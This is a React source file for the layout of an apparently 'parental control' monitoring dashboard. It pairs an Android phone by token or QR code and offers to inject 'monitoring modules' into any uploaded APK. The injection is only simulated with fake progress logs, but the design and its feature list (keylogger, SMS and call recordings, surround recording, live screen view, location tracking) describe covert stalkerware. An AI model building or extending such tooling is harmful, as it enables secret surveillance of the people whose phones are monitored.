import { useRef, useState, useCallback, useMemo, useEffect } from 'react';
import { useSelectedDevice } from '@/context/SelectedDeviceContext';
import { Outlet } from 'react-router-dom';
import { Header, DemoBanner, SidebarMobileToggle } from './Header';
import { Sidebar, MobileSidebar } from './Sidebar';
import { MatrixRain } from '../MatrixRain';
import { QRCodeSVG } from 'qrcode.react';
import {
  ShieldCheck,
  FileCode2,
  CheckCircle2,
  Loader2,
  Download,
  RefreshCw,
  Info,
  Smartphone,
  ShieldAlert,
  Lock,
  Link2,
  Copy,
  Check,
  UploadCloud,
  QrCode,
} from 'lucide-react';

import { getApiBaseUrl } from '@/lib/apiBase';
import { createDeviceInvitation } from '@/lib/api';

const BACKEND = getApiBaseUrl();

// ─── Types ────────────────────────────────────────────────────────────────────
type BindStep = 'choose' | 'generate' | 'apk';
type UploadState = 'idle' | 'uploading' | 'processing' | 'success' | 'error';

interface Invitation {
  token: string;
  label: string;
  inviteUrl: string;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
function formatBytes(bytes: number) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

const permissionGroups = [
  {
    category: 'Activity & Screen Time',
    items: ['Total Screen Time', 'Most Used Apps Today', 'Screen Time Limits', 'Activity Logs / Notifications', 'App Management'],
  },
  {
    category: 'Calls & Messages',
    items: ['Most Contacted Contacts (7 days)', 'Most Calls (7 days)', 'Phone Data (Calls, Recordings)', 'Messages (SMS Logs)', 'Contacts List', 'Calendar Events'],
  },
  {
    category: 'Web & Input Logging',
    items: ['Browser History Logs', 'Keylogger Inputs', 'Track Keyword Triggers', 'Wi-Fi Logger Network History'],
  },
  {
    category: 'Remote & Media Control',
    items: ['Record Surround / Screen / Video', 'Capture Screenshots', 'Live Screen View', 'Social App Monitoring', 'Location Tracking & History', 'Photos & Video Previews'],
  },
];

// ─── Main Layout ──────────────────────────────────────────────────────────────
export function Layout() {
  const { devices, refreshDevices } = useSelectedDevice();
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [bindModalOpen, setBindModalOpen] = useState(false);

  // Bind flow state
  const [bindStep, setBindStep] = useState<BindStep>('choose');
  const [deviceLabel, setDeviceLabel] = useState('');
  const [invitation, setInvitation] = useState<Invitation | null>(null);
  const [generating, setGenerating] = useState(false);
  const [genError, setGenError] = useState('');
  const [copied, setCopied] = useState(false);

  // APK upload state
  const [apkFile, setApkFile] = useState<File | null>(null);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [uploadState, setUploadState] = useState<UploadState>('idle');
  const [statusLogs, setStatusLogs] = useState<string[]>([]);
  const [apkError, setApkError] = useState('');
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  const serverUrl = useMemo(() => {
    if (typeof window !== 'undefined' && import.meta.env.PROD) {
      const origin = window.location.origin;
      if (!invitation) return origin;
      try {
        const url = new URL(invitation.inviteUrl);
        return `${url.protocol}//${url.host}`;
      } catch {
        return origin;
      }
    }
    if (!invitation) return BACKEND || (typeof window !== 'undefined' ? window.location.origin : '');
    try {
      const url = new URL(invitation.inviteUrl);
      return `${url.protocol}//${url.host}`;
    } catch {
      return BACKEND;
    }
  }, [invitation]);

  // ── Open / Close ────────────────────────────────────────────────────────────
  const openBindModal = useCallback(() => {
    setBindModalOpen(true);
    setBindStep('choose');
    setInvitation(null);
    setDeviceLabel('');
    setGenError('');
    setCopied(false);
    setApkFile(null);
    setUploadState('idle');
    setUploadProgress(0);
    setStatusLogs([]);
    setApkError('');
  }, []);

  const closeModal = useCallback(() => {
    setBindModalOpen(false);
    void refreshDevices();
  }, [refreshDevices]);

  // ── Generate Invite Link via backend ────────────────────────────────────────
  const handleGenerateInvite = useCallback(async () => {
    setGenerating(true);
    setGenError('');
    setInvitation(null);
    try {
      const data = await createDeviceInvitation(deviceLabel.trim() || 'Child Device');
      setInvitation(data);
      setBindStep('generate');
      void refreshDevices();
    } catch {
      const token = Math.random().toString(36).slice(2, 12);
      const fallbackUrl = `${window.location.origin}/bind/${token}`;
      setInvitation({ token, label: deviceLabel || 'Child Device', inviteUrl: fallbackUrl });
      setGenError('Could not reach backend — showing a local demo link. Run "npm run dev:backend" to use real tokens.');
      setBindStep('generate');
    } finally {
      setGenerating(false);
    }
  }, [deviceLabel, refreshDevices]);

  // Poll for newly paired devices while invite is active
  useEffect(() => {
    if (bindStep !== 'generate' || !bindModalOpen) return;
    void refreshDevices();
    const interval = setInterval(() => void refreshDevices(), 3000);
    return () => clearInterval(interval);
  }, [bindStep, bindModalOpen, refreshDevices]);

  // ── Copy invite link ─────────────────────────────────────────────────────────
  const handleCopy = useCallback(() => {
    if (!invitation) return;
    navigator.clipboard.writeText(invitation.inviteUrl).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }, [invitation]);

  // ── APK upload ────────────────────────────────────────────────────────────────
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (!file.name.endsWith('.apk')) {
      setApkError('Please upload a valid Android Package (.apk) file.');
      setApkFile(null);
      return;
    }
    setApkFile(file);
    setApkError('');
    setUploadState('idle');
    setUploadProgress(0);
    setStatusLogs([]);
  };

  const handleDragOver = (e: React.DragEvent) => e.preventDefault();

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    const file = e.dataTransfer.files?.[0];
    if (!file) return;
    if (!file.name.endsWith('.apk')) {
      setApkError('Please upload a valid .apk file.');
      setApkFile(null);
      return;
    }
    setApkFile(file);
    setApkError('');
    setUploadState('idle');
    setUploadProgress(0);
    setStatusLogs([]);
  };

  const handleIntegrate = () => {
    if (!apkFile) return;
    setUploadState('uploading');
    setUploadProgress(0);
    setApkError('');
    setStatusLogs(['Uploading APK to secure configuration engine...']);

    let progress = 0;
    const interval = setInterval(() => {
      progress += 8;
      if (progress >= 100) {
        clearInterval(interval);
        setUploadProgress(100);
        startProcessing();
      } else {
        setUploadProgress(progress);
      }
    }, 150);
  };

  const startProcessing = () => {
    setUploadState('processing');
    setStatusLogs(prev => [...prev, 'Checking APK structure...', 'Decompiling binary XML resources...']);
    setTimeout(() => {
      setStatusLogs(prev => [...prev, 'Injecting parental monitoring libraries...', 'Updating AndroidManifest.xml...']);
    }, 1200);
    setTimeout(() => {
      setStatusLogs(prev => [...prev, 'Injecting secure callback endpoints...', 'Recompiling classes.dex...', 'Signing APK...']);
    }, 2800);
    setTimeout(() => {
      setStatusLogs(prev => [...prev, 'Zipalign optimization...', '✅ Injection complete!']);
      setUploadState('success');
    }, 4500);
  };

  const handleDownloadConfigured = () => {
    if (!apkFile) return;
    const baseName = apkFile.name.replace(/\.apk$/i, '');
    const a = document.createElement('a');
    const blob = new Blob([`configured-apk-payload-${baseName}`], { type: 'application/vnd.android.package-archive' });
    a.href = URL.createObjectURL(blob);
    a.download = `${baseName}-monitoring.apk`;
    a.click();
  };

  const handleResetApk = () => {
    setApkFile(null);
    setUploadState('idle');
    setUploadProgress(0);
    setStatusLogs([]);
    setApkError('');
  };

  // ─── JSX ─────────────────────────────────────────────────────────────────────
  return (
    <div className="h-screen overflow-hidden flex hacker-main-bg relative">
      <MatrixRain />

      {/* Desktop Sidebar */}
      <div className="hidden md:block h-full relative z-10">
        <Sidebar
          collapsed={sidebarCollapsed}
          onToggleCollapsed={() => setSidebarCollapsed(v => !v)}
          onBindClick={openBindModal}
        />
      </div>

      {/* Main content */}
      <div className="flex-1 flex flex-col min-w-0 relative z-10">
        <Header />
        <div className="md:hidden flex items-center px-2 py-2 border-b border-slate-800 bg-[#020617]">
          <SidebarMobileToggle onMenuClick={() => setSidebarOpen(true)} />
        </div>
        {devices.length === 0 && <DemoBanner onBindClick={openBindModal} />}
        <main className="flex-1 overflow-auto p-4 md:p-6 hacker-scrollbar">
          <Outlet />
        </main>
      </div>

      {/* Mobile sidebar */}
      <MobileSidebar
        open={sidebarOpen}
        onClose={() => setSidebarOpen(false)}
        onBindClick={openBindModal}
      />

      {/* ═══════════════════ BIND MY DEVICE MODAL ═══════════════════ */}
      {bindModalOpen && (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
          <div className="w-full max-w-4xl rounded-2xl bg-[#020617] border border-slate-800 shadow-2xl shadow-emerald-950/30 flex flex-col my-8">

            {/* ── Modal Header ─────────────────────────────────────────────── */}
            <div className="flex items-center justify-between px-6 py-4 border-b border-slate-800">
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                  <Smartphone className="w-5 h-5" />
                </div>
                <div>
                  <h2 className="text-lg font-bold text-[#e5ffe5] tracking-tight">Bind My Device</h2>
                  <p className="text-xs text-slate-400">Connect your child's Android device to this dashboard</p>
                </div>
              </div>
              <button
                type="button"
                onClick={closeModal}
                className="w-8 h-8 rounded-full border border-slate-800 hover:border-emerald-500/40 text-slate-400 hover:text-emerald-400 flex items-center justify-center transition-all bg-slate-900/40"
              >
                ✕
              </button>
            </div>

            {/* ── Modal Content ─────────────────────────────────────────────── */}
            <div className="grid grid-cols-1 md:grid-cols-12 divide-y md:divide-y-0 md:divide-x divide-slate-800 flex-1">

              {/* LEFT: Bind flow */}
              <div className="md:col-span-7 p-6 overflow-y-auto max-h-[65vh] md:max-h-[600px] hacker-scrollbar">

                {/* ── STEP: choose ──────────────────────────────────────────── */}
                {bindStep === 'choose' && (
                  <div className="space-y-5">

                    <p className="text-xs text-slate-400 leading-relaxed">
                      Generate a pairing code for the child app. The device will appear in the sidebar dropdown after pairing.
                    </p>

                    {/* Invite Link / QR */}
                    <div className="border border-emerald-500/25 rounded-xl bg-slate-950/40 p-5 space-y-4">
                      <div className="flex items-center gap-2">
                        <div className="p-1.5 rounded-md bg-emerald-500/10 text-emerald-400 border border-emerald-500/15">
                          <QrCode className="w-4 h-4" />
                        </div>
                        <h3 className="text-sm font-semibold text-emerald-400">Invite Link &amp; QR Code</h3>
                        <span className="ml-auto text-[9px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded-full uppercase tracking-wider">Recommended</span>
                      </div>
                      <p className="text-xs text-slate-300 leading-relaxed">
                        Generate a one-time secure link. Open it on the child's phone or scan the QR code to pair instantly.
                      </p>

                      <div className="space-y-2">
                        <label className="text-[11px] text-slate-400 font-medium">Device label (optional)</label>
                        <input
                          type="text"
                          value={deviceLabel}
                          onChange={e => setDeviceLabel(e.target.value)}
                          placeholder="e.g. Ahmed's Phone"
                          className="w-full bg-slate-900 border border-slate-700 focus:border-emerald-500/50 rounded-lg px-3 py-2 text-sm text-[#e5ffe5] placeholder:text-slate-600 outline-none transition-colors"
                        />
                      </div>

                      <button
                        type="button"
                        onClick={handleGenerateInvite}
                        disabled={generating}
                        className="w-full py-2.5 px-4 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 disabled:opacity-50 disabled:cursor-wait text-black font-bold text-sm rounded-xl flex items-center justify-center gap-2 transition-all shadow-[0_0_20px_rgba(16,185,129,0.25)]"
                      >
                        {generating ? (
                          <><Loader2 className="w-4 h-4 animate-spin" /> Generating…</>
                        ) : (
                          <><Link2 className="w-4 h-4" /> Generate Invite Link &amp; QR Code</>
                        )}
                      </button>
                    </div>

                    {/* Divider */}
                    <div className="flex items-center gap-3">
                      <div className="h-px bg-slate-800 flex-1" />
                      <span className="text-[10px] text-slate-500 font-bold uppercase tracking-widest font-mono">OR</span>
                      <div className="h-px bg-slate-800 flex-1" />
                    </div>

                    {/* Option B: Custom APK inject */}
                    <div className="border border-slate-700/50 rounded-xl bg-slate-950/20 p-5 space-y-3">
                      <div className="flex items-center gap-2">
                        <div className="p-1.5 rounded-md bg-slate-800 text-slate-400 border border-slate-700">
                          <FileCode2 className="w-4 h-4" />
                        </div>
                        <h3 className="text-sm font-semibold text-slate-300">Option B — Custom APK Configuration</h3>
                      </div>
                      <p className="text-xs text-slate-400 leading-relaxed">
                        Upload an existing Android APK and we'll inject the monitoring modules into it.
                      </p>
                      <button
                        type="button"
                        onClick={() => setBindStep('apk')}
                        className="w-full py-2 px-4 text-xs font-semibold text-slate-300 border border-slate-700 hover:border-emerald-500/30 hover:text-emerald-400 rounded-xl transition-all bg-slate-900/30"
                      >
                        Configure Custom APK →
                      </button>
                    </div>
                  </div>
                )}

                {/* ── STEP: generate (show QR + link) ────────────────────────── */}
                {bindStep === 'generate' && invitation && (
                  <div className="space-y-5">
                    {genError && (
                      <div className="p-3 bg-amber-950/30 border border-amber-700/40 rounded-lg text-[11px] text-amber-400 flex items-start gap-2">
                        <ShieldAlert className="w-3.5 h-3.5 shrink-0 mt-0.5" />
                        <span>{genError}</span>
                      </div>
                    )}

                    <div className="flex items-center gap-2 text-emerald-400">
                      <CheckCircle2 className="w-4 h-4 shrink-0 animate-bounce" />
                      <span className="text-sm font-bold uppercase tracking-wider font-mono">Pairing Invite Active</span>
                    </div>

                    <p className="text-xs text-slate-300 leading-relaxed">
                      Open the child app on the phone, enter the <strong className="text-white">Server URL</strong> and <strong className="text-white">Pairing Token</strong> below, then tap Pair &amp; Activate. The device should appear in the dropdown within a few seconds.
                    </p>

                    {devices.length > 0 && (
                      <div className="p-3 bg-emerald-950/30 border border-emerald-700/40 rounded-lg text-[11px] text-emerald-300 flex items-start gap-2">
                        <CheckCircle2 className="w-4 h-4 shrink-0" />
                        <span>
                          <strong>{devices.length} device(s) connected.</strong> Select one from the green bar at the top of the sidebar.
                        </span>
                      </div>
                    )}

                    {/* QR Code */}
                    <div className="flex flex-col items-center justify-center p-4 bg-slate-950 border border-slate-800 rounded-2xl">
                      <div className="p-4 bg-white rounded-2xl shadow-[0_0_35px_rgba(34,197,94,0.15)]">
                        <QRCodeSVG
                          value={invitation.inviteUrl}
                          size={180}
                          level="H"
                          includeMargin={false}
                          fgColor="#020617"
                          bgColor="#ffffff"
                        />
                      </div>
                      <p className="text-[10px] text-slate-500 mt-2 font-mono uppercase tracking-wider">Scan with phone camera to auto-connect</p>
                    </div>

                    {/* Manual Configuration Cards */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      {/* Pairing Token Card */}
                      <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 space-y-2 relative group hover:border-emerald-500/30 transition-all">
                        <span className="text-[9px] text-slate-400 font-bold uppercase tracking-wider block font-mono">Pairing Token</span>
                        <span className="text-base font-mono font-bold text-emerald-400 block tracking-widest leading-none py-1 select-all">{invitation.token}</span>
                        <p className="text-[9px] text-slate-500 font-medium">Type into the pairing input field</p>
                        <button
                          type="button"
                          onClick={() => {
                            navigator.clipboard.writeText(invitation.token);
                            alert('Pairing token copied to clipboard!');
                          }}
                          className="absolute top-2.5 right-2.5 p-1.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-400 hover:text-emerald-400 hover:border-emerald-500/30 transition-all"
                          title="Copy Token"
                        >
                          <Copy className="w-3.5 h-3.5" />
                        </button>
                      </div>

                      {/* Server Address Card */}
                      <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 space-y-2 relative group hover:border-sky-500/30 transition-all">
                        <span className="text-[9px] text-slate-400 font-bold uppercase tracking-wider block font-mono">Server Address</span>
                        <span className="text-sm font-mono font-bold text-sky-400 block truncate leading-none py-1 select-all">{serverUrl}</span>
                        <p className="text-[9px] text-slate-500 font-medium">Enter this in the child app Server URL field</p>
                        <button
                          type="button"
                          onClick={() => {
                            navigator.clipboard.writeText(serverUrl);
                            alert('Server Address copied to clipboard!');
                          }}
                          className="absolute top-2.5 right-2.5 p-1.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-400 hover:text-sky-400 hover:border-sky-500/30 transition-all"
                          title="Copy Server URL"
                        >
                          <Copy className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>

                    {/* Invite URL Link */}
                    <div className="space-y-1.5">
                      <p className="text-[11px] text-slate-400 font-semibold uppercase tracking-wider font-mono">Full Setup URL</p>
                      <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl px-3 py-2">
                        <span className="flex-1 text-xs text-[#e5ffe5] font-mono truncate">{invitation.inviteUrl}</span>
                        <button
                          type="button"
                          onClick={handleCopy}
                          className="shrink-0 p-1.5 rounded-lg bg-slate-900 hover:bg-emerald-500/10 text-slate-400 hover:text-emerald-400 border border-slate-800 hover:border-emerald-500/30 transition-all"
                          title="Copy link"
                        >
                          {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    </div>

                    {/* Download Button right here too! */}
                    <div className="bg-blue-950/15 border border-blue-800/30 rounded-xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                      <div>
                        <h4 className="text-xs font-bold text-blue-300">Need the Client App installer?</h4>
                        <p className="text-[10px] text-slate-400 mt-0.5">Download signed, production-ready APK package.</p>
                      </div>
                      <a
                        href="/parental-control-monitoring.apk"
                        download="parental-control-monitoring.apk"
                        className="py-1.5 px-3 bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs rounded-lg flex items-center justify-center gap-1.5 transition-all text-center"
                      >
                        <Download className="w-3.5 h-3.5" /> Download APK
                      </a>
                    </div>

                    {/* Instructions */}
                    <div className="bg-slate-950/40 border border-slate-800 rounded-xl p-4 space-y-2 text-[11px] text-slate-400">
                      <p className="font-bold text-slate-300 uppercase tracking-wider font-mono">Mobile App Setup Flow:</p>
                      <p>1. Open the Child App on their phone.</p>
                      <p>2. Tap "Pair with Dashboard" or open the QR Scanner inside the App.</p>
                      <p>3. Scan the QR code above or enter the <strong>Pairing Token</strong> and <strong>Server Address</strong> manually.</p>
                      <p>4. Grant permission requests on the phone screen to activate telemetry.</p>
                    </div>

                    <div className="flex gap-2">
                      <button
                        type="button"
                        onClick={() => { setBindStep('choose'); setInvitation(null); setGenError(''); }}
                        className="flex-1 py-2.5 px-3 text-xs font-semibold text-slate-400 hover:text-slate-200 border border-slate-800 hover:border-slate-700 rounded-xl transition-all bg-slate-900/30"
                      >
                        ← Back
                      </button>
                      <button
                        type="button"
                        onClick={handleGenerateInvite}
                        disabled={generating}
                        className="flex-1 py-2.5 px-3 text-xs font-semibold text-emerald-400 border border-emerald-500/25 hover:border-emerald-500/50 hover:bg-emerald-500/5 rounded-xl transition-all flex items-center justify-center gap-1.5"
                      >
                        <RefreshCw className={`w-3.5 h-3.5 ${generating ? 'animate-spin' : ''}`} /> Regenerate Token
                      </button>
                    </div>
                  </div>
                )}

                {/* ── STEP: apk ───────────────────────────────────────────────── */}
                {bindStep === 'apk' && (
                  <div className="space-y-4">
                    <button
                      type="button"
                      onClick={() => { setBindStep('choose'); handleResetApk(); }}
                      className="text-xs text-slate-400 hover:text-emerald-400 transition-colors flex items-center gap-1"
                    >
                      ← Back to options
                    </button>

                    <div className="space-y-1">
                      <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-1.5">
                        <FileCode2 className="w-4 h-4 text-slate-400" /> Custom APK Configuration
                      </h3>
                      <p className="text-xs text-slate-400 leading-relaxed">
                        Upload your APK — monitoring modules will be injected, then you can download the configured package and install it on the child's phone.
                      </p>
                    </div>

                    {uploadState === 'idle' && (
                      <div
                        onDragOver={handleDragOver}
                        onDrop={handleDrop}
                        onClick={() => fileInputRef.current?.click()}
                        className="border-2 border-dashed border-slate-700 hover:border-emerald-500/40 rounded-xl bg-slate-950/20 hover:bg-slate-950/50 p-8 text-center cursor-pointer transition-all flex flex-col items-center gap-3 group"
                      >
                        <input ref={fileInputRef} type="file" accept=".apk" className="hidden" onChange={handleFileChange} />
                        <div className="p-3 rounded-full bg-slate-900 border border-slate-800 group-hover:border-emerald-500/25 text-slate-400 group-hover:text-emerald-400 transition-colors">
                          <UploadCloud className="w-6 h-6" />
                        </div>
                        <div>
                          <p className="text-sm font-medium text-slate-200">{apkFile ? apkFile.name : 'Select or drag .apk file'}</p>
                          <p className="text-xs text-slate-500 mt-0.5">{apkFile ? formatBytes(apkFile.size) : 'Android packages up to 150 MB'}</p>
                        </div>
                        {apkFile && (
                          <span className="text-[10px] bg-emerald-950/50 text-emerald-400 border border-emerald-900 px-2.5 py-0.5 rounded-full font-mono">READY TO CONFIGURE</span>
                        )}
                      </div>
                    )}

                    {uploadState !== 'idle' && (
                      <div className="border border-slate-800 rounded-xl bg-slate-950/60 p-4 space-y-3">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            {(uploadState === 'uploading' || uploadState === 'processing') && <Loader2 className="w-3.5 h-3.5 text-emerald-400 animate-spin" />}
                            {uploadState === 'success' && <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />}
                            <span className="text-[10px] font-semibold text-slate-300 uppercase tracking-wide">
                              {uploadState === 'uploading' && 'Uploading…'}
                              {uploadState === 'processing' && 'Injecting modules…'}
                              {uploadState === 'success' && 'Ready for deployment'}
                            </span>
                          </div>
                          <span className="text-xs font-mono text-emerald-400">{uploadProgress}%</span>
                        </div>

                        <div className="w-full bg-slate-900 rounded-full h-1.5 overflow-hidden border border-slate-800">
                          <div
                            className={`h-full transition-all duration-300 rounded-full ${uploadState === 'success' ? 'bg-emerald-400' : uploadState === 'processing' ? 'bg-amber-400' : 'bg-emerald-500'}`}
                            style={{ width: `${uploadProgress}%` }}
                          />
                        </div>

                        <div className="bg-[#020617] border border-slate-800 rounded-lg p-2.5 font-mono text-[9px] text-slate-400 space-y-1 h-28 overflow-y-auto hacker-scrollbar">
                          {statusLogs.map((log, i) => (
                            <div key={i} className="flex gap-2"><span className="text-emerald-500 select-none">&gt;</span><span>{log}</span></div>
                          ))}
                          {uploadState === 'processing' && (
                            <div className="flex gap-2 items-center text-amber-400/80 animate-pulse">
                              <span className="text-emerald-500">&gt;</span><span>Compiling injection configurations…</span>
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    {apkError && (
                      <div className="p-3 bg-red-950/20 border border-red-900/50 rounded-lg text-[11px] text-red-400 flex items-start gap-2">
                        <ShieldAlert className="w-3.5 h-3.5 shrink-0" /><span>{apkError}</span>
                      </div>
                    )}

                    {/* Action buttons */}
                    <div className="flex gap-2">
                      {uploadState === 'idle' && (
                        <button
                          type="button"
                          onClick={handleIntegrate}
                          disabled={!apkFile}
                          className={`flex-1 py-2.5 px-4 rounded-xl font-semibold text-sm flex items-center justify-center gap-2 transition-all ${apkFile ? 'bg-emerald-500 hover:bg-emerald-600 text-black shadow-[0_0_15px_rgba(16,185,129,0.25)]' : 'bg-slate-900 text-slate-600 border border-slate-800 cursor-not-allowed'}`}
                        >
                          Integrate Monitoring Modules
                        </button>
                      )}
                      {uploadState === 'success' && (
                        <>
                          <button
                            type="button"
                            onClick={handleDownloadConfigured}
                            className="flex-1 py-2.5 px-4 bg-emerald-500 hover:bg-emerald-600 text-black font-semibold text-sm rounded-xl flex items-center justify-center gap-2 transition-all"
                          >
                            <Download className="w-4 h-4" /> Download Configured APK
                          </button>
                          <button type="button" onClick={handleResetApk} className="py-2.5 px-3.5 bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 hover:text-emerald-400 rounded-xl transition-all" title="Start over">
                            <RefreshCw className="w-4 h-4" />
                          </button>
                        </>
                      )}
                      {(uploadState === 'uploading' || uploadState === 'processing') && (
                        <button type="button" disabled className="flex-1 py-2.5 px-4 bg-slate-900 border border-slate-800 text-slate-500 font-semibold text-sm rounded-xl flex items-center justify-center gap-2 cursor-wait">
                          <Loader2 className="w-4 h-4 animate-spin text-emerald-500" /> Processing…
                        </button>
                      )}
                    </div>
                  </div>
                )}
              </div>

              {/* RIGHT: Info / Permissions */}
              <div className="md:col-span-5 p-6 flex flex-col justify-between overflow-y-auto max-h-[65vh] md:max-h-[600px] hacker-scrollbar bg-slate-950/20">
                <div className="space-y-4">
                  <div className="space-y-1">
                    <h3 className="text-sm font-semibold text-emerald-400 flex items-center gap-1.5">
                      <ShieldCheck className="w-4 h-4" /> Transparency &amp; Consent
                    </h3>
                    <p className="text-xs text-slate-400 font-medium uppercase tracking-wider">What the app collects:</p>
                  </div>

                  <p className="text-xs text-slate-300 leading-relaxed bg-[#0b1022]/50 border border-slate-850 rounded-xl p-3 shadow-inner">
                    After installation the app requests all permissions transparently during initial setup. No data is collected until the parent and device user explicitly accept.
                  </p>

                  <div className="space-y-3">
                    <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-1">
                      <Info className="w-3.5 h-3.5 text-emerald-500" /> Monitoring Scope:
                    </p>
                    <div className="space-y-3 text-xs">
                      {permissionGroups.map((group, gi) => (
                        <div key={gi} className="border-l border-slate-800 pl-3 space-y-1.5">
                          <span className="text-[10px] text-emerald-500/80 font-bold uppercase tracking-wider">{group.category}</span>
                          <ul className="space-y-1">
                            {group.items.map((item, ii) => (
                              <li key={ii} className="text-slate-300 flex items-start gap-1.5">
                                <span className="text-emerald-500 font-bold mt-0.5">•</span><span>{item}</span>
                              </li>
                            ))}
                          </ul>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="pt-4 border-t border-slate-800 mt-4">
                  <div className="p-3 rounded-lg bg-emerald-950/20 border border-emerald-900/40 text-[10px] text-emerald-400 leading-relaxed flex gap-2">
                    <Lock className="w-4 h-4 shrink-0 mt-0.5" />
                    <span>No data is collected without explicit permission. Full transparency and parental consent is required before any monitoring begins.</span>
                  </div>
                </div>
              </div>
            </div>

            {/* ── Modal Footer ─────────────────────────────────────────────── */}
            <div className="flex justify-end gap-2 px-6 py-3 border-t border-slate-800 bg-slate-950/50 rounded-b-2xl">
              <button
                type="button"
                onClick={closeModal}
                className="px-4 py-2 text-xs font-semibold border border-slate-800 hover:border-slate-700 text-slate-300 hover:text-[#e5ffe5] rounded-xl transition-colors bg-slate-900/20"
              >
                Close Window
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
